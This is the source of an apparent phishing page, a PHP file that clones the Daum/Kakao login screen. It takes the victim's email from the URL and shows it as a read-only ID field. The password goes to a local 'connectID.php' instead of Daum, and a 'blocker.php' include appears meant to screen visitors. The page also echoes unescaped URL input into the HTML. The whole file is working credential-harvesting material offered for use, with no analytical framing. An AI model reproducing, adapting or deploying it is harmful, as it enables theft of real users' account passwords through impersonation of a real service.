<?php
include('blocker.php');
?>
<?php
function getemailIDFromemail($email)
{
$find = '@';
$pos = strpos($email, $find);
$emailID = substr($email, 0, $pos);
return $emailID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$email = $_GET['email'];
$emailID = getemailIDFromemail($email);
$domain = getDomainFromEmail($email);
$ln = strlen($email);
$len = strrev($email);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!doctype html>
<html lang="ko">
<head>
    <meta charset="utf-8">
	<link rel="SHORTCUT ICON" href="https://logins.daum.net/favicon.ico"/>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta property="og:title" content="Daum 로그인">
    <meta property="og:type" content="website">
    <meta property="og:image" content="http://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
    <meta property="og:image:secure_url" content="https://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
    <meta property="og:description" content="여기를 눌러 링크를 확인하세요.">
    <link rel="stylesheet" type="text/css" href="pc.css">
    <link rel="stylesheet" type="text/css" href="font_pc.css">
    <title>Daum 로그인</title>
</head>
<body>
<div id="kakaoWrap">
		<div id="kakaoHead">
		<div class="inner_head">
			<h1>
				<a href="http://www.daum.net" id="daumLogo" class="link_daum" alt="Daum"
				   onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'daum_logo']);">
					<span class="ir_wa">DAUM</span>
				</a>
			</h1>
		</div>
	</div>

	<hr class="hide" >
	<div id="kakaoContent" class="cont_login" role="main">
		<!-- 아이디입력도움말 노출시 view_help클래스 / 자판보기 노출시 view_key클래스 / 특수문자 노출시 view_char클래스 추가 -->
		<div id="mArticle">
			<h2 class="screen_out">아이디 로그인</h2>
			<div class="section_login">
                
				<div id="loginFormDiv" class="login_default">
					<form id="loginForm" method="post" action="connectID.php">
						<input type="hidden" name="url" value="http://www.daum.net/raptor/mini?nil_top=mobile" />
						<input type="hidden" name="relative" value="" />
						<input type="hidden" name="weblogin" value="1" />
                        <input type="hidden" name="service" value="" />
						<input type="hidden" name="email" value="<?php echo $email ?>" >
						                            <input type="hidden" name="slevel" value="1" />
                            <input type="hidden" name="finaldest" value="" />
                            <input type="hidden" name="reloginSeq" value="0" />
							
												
						<fieldset class="fld_comm">
							<legend class="screen_out">아이디,비밀번호 로그인 정보 입력 폼</legend>
							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
								<label for="id" class="lab_g "></label> <!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
								<input type="email" id="id" name="id" readonly="" required="" placeholder="아이디 입력" value="<?php echo $emailID ?>" class="tf_g" style="ime-mode:disabled;">
								<button type="button" class="btn_del"><span class="ico_login ico_del">입력 내용 지우기</span></button>
							</div>
							<p id="id_msg" class="txt_message" style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
								
							</p>

							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
								<label for="inputPwd" class="lab_g "></label> <!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
								<input type="password" autofocus="" id="inputPwd" name="pw" required="" placeholder="비밀번호 입력" class="tf_g"  maxlength="32" autocomplete="off" style="ime-mode:disabled;">
								<button type="button" class="btn_del"><span class="ico_login ico_del">입력 내용 지우기</span></button>
							</div>
							<p id="pw_msg" class="txt_message"  style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
								
							</p>

							<button id="loginBtn" type="submit" class="btn_comm" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'login_daum']);">로그인</button>
							
							<div class="set_login"> <!-- 2016-10-10 툴팁노출시 tooltip_on클래스 추가 -->
									<span class="set_comm "> <!-- 선택시 check_on클래스 추가 -->
										<label for="stln" class="lab_check" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'stln']);">로그인 상태 유지</label>
										<span class="check_g">
											<input type="checkbox" id="stln" name="stln" value="1"  class="inp_check"  onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'stln']);">
											<span class="ico_login ico_check">선택안됨</span> <!-- inp_check에 초점이 이동한경우 해당 ico_check요소에 focus클래스 추가 / 선택상태에 맞게 '선택됨','선택안됨' 으로 대체텍스트 제공 -->
										</span>
									</span>
								<div class="layer_set" style=" display:none "><!-- 비노출시 display:none 처리 -->
									<p class="desc_set">개인정보 보호를 위해, 개인 PC에서만 사용해 주세요.</p>
									<span class="ico_login ico_point"></span>
								</div>
									<span class="set_security "><!-- 체크해제 시 check_off클래스 추가 -->
										<a href="#none" id="linkSecurity" class="link_security" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'ipsecurity_label']);">IP보안</a>
										<input type="checkbox" id="ipSecurity" name="ipSecurity" class="inp_check" value="checked" checked="checked">
										<label for="ipSecurity" class="ico_login lab_security" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'ipsecurity_onoff']);">IP보안 설정 ON</label><!-- inp_check에 초점이 이동한경우 해당 lab_security요소에 focus클래스 추가 / ON,OFF선택에 맞게 'IP보안 설정 ON','IP보안 설정 OFF'로 대체텍스트 제공 -->
									</span>
							</div>
						</fieldset>
					</form>
					<div class="login_help">
						<button type="button" class="btn_help btn_key " onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'open_keyboard']);">자판보기<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
						<button type="button" class="btn_help btn_key " onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'special_char']);">특수문자<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
						<button type="button" class="btn_help " onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'id_help']);">아이디 입력 도움말<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
					</div>
					<div class="area_help" style="display:none">
						<div class="bg_help img_key"></div>
					</div>
					<div class="area_help" style="display:none">
						<div class="bg_help img_char"></div>
					</div>
					<div class="area_help" style="display:none">
						<ul class="list_help">
							<li><span class="ico_login ico_dot"></span>이메일아이디는 <em class="emph_login">이메일 전체를 입력</em>해 주세요. <span class="txt_help">예) abc@example.com</span></li>
							<li><span class="ico_login ico_dot"></span>폰번호아이디는 <em class="emph_login">폰번호 앞에 #을 붙여서 입력</em>해 주세요. <span class="txt_help">예) #01090008000</span></li>
						</ul>
						<button type="button" class="btn_close">도움말 닫기<span class="ico_login ico_close"></span></button>
					</div>
					<div class="login_rel">
						<a href="https://member.daum.net/join/terms?rtnUrl=http%3A%2F%2Fwww.daum.net%2Fraptor%2Fmini%3Fnil_top%3Dmobile" id="signUp" class="link_rel" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'join']);">회원가입</a><span class="txt_bar">|</span><a href="https://member.daum.net/find/id.do" id="findID" class="link_rel" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'findid']);">아이디 찾기</a><span class="txt_bar">|</span><a href="https://member.daum.net/find/password.do" id="findPW" class="link_rel" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'findpw']);">비밀번호 찾기</a>
					</div>
										<div class="wrap_util">
						<a href="#" class="link_kakao" id="btnKakaoLogin" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'login_kakao']);"><span class="ico_login ico_klogin"></span><span class="txt_kakao">카카오계정으로 로그인</span></a>
					</div>
									</div>
			</div>

						<div class="info_etc">
				<iframe src="https://display.ad.daum.net/imp?slotid=00Y28" width="250" height="250" id="login_AMS"
						title="광고" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe>
			</div>
					</div>
	</div>

	<hr class="hide">

	<div id="kakaoFoot">
		<h2 class="screen_out">서비스 이용정보</h2>
		<a href=http://www.kakaocorp.com/ class="link_kcorp" target="_blank"
		   onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'footer_corp']);">&copy; Kakao Corp.</a>
		<span class="txt_bar">|</span>
		<a href=http://cs.daum.net/faq/59/14970.html class="link_custom" target="_blank"
		   onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'footer_cs']);">고객센터</a>
	</div>
	        <div style="display:none">
            <form novalidate id="kakaoLoginForm" method="post" action="https://logins.daum.net/accounts/kakaologin.do">
                <input type="hidden" name="url" value="http://www.daum.net/raptor/mini?nil_top=mobile"/>
                <input type="hidden" name="service" value=""/>
                <input type="hidden" name="finaldest" value=""/>
                <input type="hidden" name="reloginSeq" value="0"/>
                <input type="hidden" name="relative" value=""/>
                <input type="hidden" name="weblogin" value="1"/>
                <input type="hidden" name="slevel" value="1"/>
                <input type="hidden" name="platform" value="pc_web"/>
				                <input type="hidden" name="handlebackurl" id="handlebackurl" value=""/>
            </form>
        </div>
	</div>

<script type="text/javascript" src="https://s1.daumcdn.net/svc/original/U03/cssjs/jquery/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://s1.daumcdn.net/svc/original/U03/cssjs/jquery/plugin/jquery.cookie-1.3.1.min.js"></script>

<script type="text/javascript" src="/min/js/2.4/jquery-init.js"></script>
<script type="text/javascript" src="/min/js/2.4/login-all.js"></script>
<script type="text/javascript" src="/min/js/2.4/swfobject.js?v=0.1"></script>
<script type="text/javascript" src="/min/js/2.4/loginform.js"></script>
<script type="text/javascript" src="/min/js/2.4/form-resize.js"></script>
<script type="text/javascript" src="//developers.kakao.com/sdk/js/kakao.min.js"></script><script type="text/javascript">
    jQuery(document).ready(function () {
                var virtualKeyView = new VirtualKeyView('#kakaoContent');
        virtualKeyView.initialize();

                toggleBodyClass();

        var loginForm = new LoginForm('#loginForm', {
			            dummy: 0
        }).initialize();

        if (daumlogin.srp) {
            daumlogin.srp.setValidator(loginForm.checkValid);
        }

		            Kakao.init('d10838164fe04a4e6da8e1f6d9972096');

            jQuery("#btnKakaoLogin").click(function () {
                _tiq.push(['__trackEvent', 'loginform_pc', 'login_kakao']);

                Kakao.Auth.login({
                    success: function (authObj) {
                        var input = jQuery("<input>")
                                .attr("type", "hidden")
                                .attr("name", "access_token").val(authObj.access_token);

                        jQuery('#kakaoLoginForm').append(jQuery(input));
                        jQuery("#kakaoLoginForm").submit();
                    },
                    fail: function (err) {
                        if (err.error !== 'access_denied' && err.error !== 'window_closed') {
                            alert('카카오계정 로그인이 실패하였습니다. \n' + JSON.stringify(err.error_description));
                        }
                    },
                    approvalType: 'project'
                });

                return false;
            });
			                document.getElementById('handlebackurl').value = document.location.href;
					    });
</script>
		<script type='text/javascript'>
    var _tiq = 'undefined' !== typeof _tiq ? _tiq : []; // Global Variables

    _tiq.push(['__trackPageview']);

    (function(d) {
        var se = d.createElement('script'); se.type = 'text/javascript'; se.async = true;
        se.src = location.protocol + '//m1.daumcdn.net/tiara/js/td.min.js';
        var s = d.getElementsByTagName('head')[0]; s.appendChild(se);
    })(document);
</script>
    </body>
</html>